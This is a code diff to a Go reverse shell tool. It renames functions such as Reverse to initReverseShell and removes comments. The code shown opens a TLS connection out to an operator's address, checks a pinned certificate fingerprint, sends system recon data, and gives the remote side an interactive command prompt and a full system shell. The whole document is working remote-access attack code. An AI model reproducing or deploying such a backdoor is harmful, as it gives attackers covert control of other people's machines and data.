@@ -28,14 +28,13 @@ var (
 	fingerPrint   string
 )
 
-func Send(conn net.Conn, msg string) {
+func send(conn net.Conn, msg string) {
 	conn.Write([]byte("\n"))
 	conn.Write([]byte(msg))
 	conn.Write([]byte("\n"))
 }
 
-// Takes a network connection as its arg so it can pass stdio to it
-func InteractiveShell(conn net.Conn) {
+func interactiveShell(conn net.Conn) {
 	var (
 		name, _                = os.Hostname()
 		prompt  string         = fmt.Sprintf("\n[%s]> ", name)
@@ -43,7 +42,7 @@ func InteractiveShell(conn net.Conn) {
 	)
 
 	// Print basic recon data on first connect
-	Send(conn, sitrep.SysInfo())
+	send(conn, sitrep.SysInfo())
 	conn.Write([]byte(prompt))
 
 	for scanner.Scan() {
@@ -51,18 +50,18 @@ func InteractiveShell(conn net.Conn) {
 		if command == "exit" {
 			break
 		} else if command == "shell" {
-			RunShell(conn)
+			runShell(conn)
 		} else if len(command) > 1 {
 			argv := strings.Split(command, " ")
 			out := commands.Route(argv)
-			Send(conn, out)
+			send(conn, out)
 		}
 
 		conn.Write([]byte(prompt))
 	}
 }
 
-func RunShell(conn net.Conn) {
+func runShell(conn net.Conn) {
 	var cmd *exec.Cmd = shell.GetShell()
 	cmd.Stdout = conn
 	cmd.Stderr = conn
@@ -70,7 +69,7 @@ func RunShell(conn net.Conn) {
 	cmd.Run()
 }
 
-func CheckKeyPin(conn *tls.Conn, fingerprint []byte) bool {
+func isValidKey(conn *tls.Conn, fingerprint []byte) bool {
 	valid := false
 	connState := conn.ConnectionState()
 	for _, peerCert := range connState.PeerCertificates {
@@ -82,8 +81,7 @@ func CheckKeyPin(conn *tls.Conn, fingerprint []byte) bool {
 	return valid
 }
 
-// Creates the TLS connection before passing it to the InteractiveShell function
-func Reverse(connectString string, fingerprint []byte) {
+func initReverseShell(connectString string, fingerprint []byte) {
 	var (
 		conn *tls.Conn
 		err  error
@@ -95,10 +93,10 @@ func Reverse(connectString string, fingerprint []byte) {
 	}
 	defer conn.Close()
 
-	if ok := CheckKeyPin(conn, fingerprint); !ok {
+	if ok := isValidKey(conn, fingerprint); !ok {
 		os.Exit(ERR_BAD_FINGERPRINT)
 	}
-	InteractiveShell(conn)
+	interactiveShell(conn)
 }
 
 func main() {
@@ -108,6 +106,6 @@ func main() {
 		if err != nil {
 			os.Exit(ERR_COULD_NOT_DECODE)
 		}
-		Reverse(connectString, bytesFingerprint)
+		initReverseShell(connectString, bytesFingerprint)
 	}
 }
